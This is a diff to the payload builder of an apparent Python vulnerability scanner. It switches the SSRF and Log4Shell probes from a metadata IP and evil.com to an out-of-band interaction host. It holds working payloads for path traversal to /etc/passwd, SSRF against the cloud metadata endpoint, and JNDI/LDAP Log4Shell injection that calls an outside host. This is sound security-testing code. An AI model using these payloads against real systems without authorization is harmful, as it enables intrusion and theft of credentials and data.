@@ -6,6 +6,7 @@ a vulnerability with a concrete PoC or reports clean. Nothing in between.
 
 from __future__ import annotations
 
+import os
 import re
 import uuid
 from dataclasses import dataclass
@@ -183,7 +184,7 @@ def build_payloads(check_key: str, url: str) -> list[dict]:
             {"param": "page", "value": "....//....//etc/passwd", "method": "GET"},
         ],
         "ssrf": [
-            {"param": "url", "value": "http://169.254.169.254/latest/meta-data/", "method": "GET"},
+            {"param": "url", "value": f"http://{os.environ.get('INTERACTSH_SERVER', '169.254.169.254/latest/meta-data/')}", "method": "GET"},
         ],
         "open_redirect": [
             {"param": "redirect", "value": f"https://{RUN_CANARY}.com", "method": "GET"},
@@ -191,8 +192,8 @@ def build_payloads(check_key: str, url: str) -> list[dict]:
             {"param": "url", "value": f"https://{RUN_CANARY}.com", "method": "GET"},
         ],
         "log4shell": [
-            {"header": "X-Api-Version", "value": "${jndi:ldap://evil.com/a}", "method": "HEADER"},
-            {"header": "User-Agent", "value": "${jndi:ldap://evil.com/a}", "method": "HEADER"},
+            {"header": "X-Api-Version", "value": f"${{jndi:ldap://{os.environ.get('INTERACTSH_SERVER', 'log4j.' + RUN_CANARY + '.interact.sh')}/a}}", "method": "HEADER"},
+            {"header": "User-Agent", "value": f"${{jndi:ldap://{os.environ.get('INTERACTSH_SERVER', 'log4j.' + RUN_CANARY + '.interact.sh')}/a}}", "method": "HEADER"},
         ],
         "shellshock": [
             {
